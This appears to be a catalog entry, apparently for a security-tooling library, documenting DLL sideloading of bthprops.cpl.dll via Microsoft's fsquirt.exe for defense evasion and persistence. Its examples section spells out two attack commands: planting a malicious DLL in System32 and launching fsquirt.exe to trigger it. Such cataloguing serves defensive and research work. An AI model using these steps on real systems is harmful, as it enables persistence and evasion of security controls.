---
trust_level: community
id: windows-dllhijack-bthprops-cpl
namespace: windows:dllhijack:bthprops-cpl
name: bthprops.cpl.dll
description: "bthprops.cpl.dll — Sideloading hijacking (Microsoft)"
author: "Swachchhanda Shrawan Poudel"
version: "1.0.0"
capabilities:
  - security.defenseevasion.dll-hijack
platforms:
  - windows
techniques:
  - defense-evasion
  - persistence
execution:
  template: "bthprops.cpl.dll"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
references:
  - label: "Reference"
    url: "https://github.com/mhaskar/FsquirtCPLPoC"
  - label: "Reference"
    url: "https://securelist.com/sidewinder-apt/114089/"
  - label: "HijackLibs"
    url: "https://hijacklibs.net/entries/bthprops-cpl.html"
---
examples:
  - description: "Place malicious bthprops.cpl.dll in the search order location"
    command: "copy malicious.dll \"%SYSTEM32%\\bthprops.cpl.dll\""
  - description: "Execute the vulnerable binary to trigger the hijack"
    command: "\"%SYSTEM32%\\fsquirt.exe\""

# bthprops.cpl.dll

**Vendor:** Microsoft

**Expected Location:** %SYSTEM32%

**Vulnerable Executables:**
- %SYSTEM32%\fsquirt.exe (Sideloading)

**Acknowledgement:** Swachchhanda Shrawan Poudel
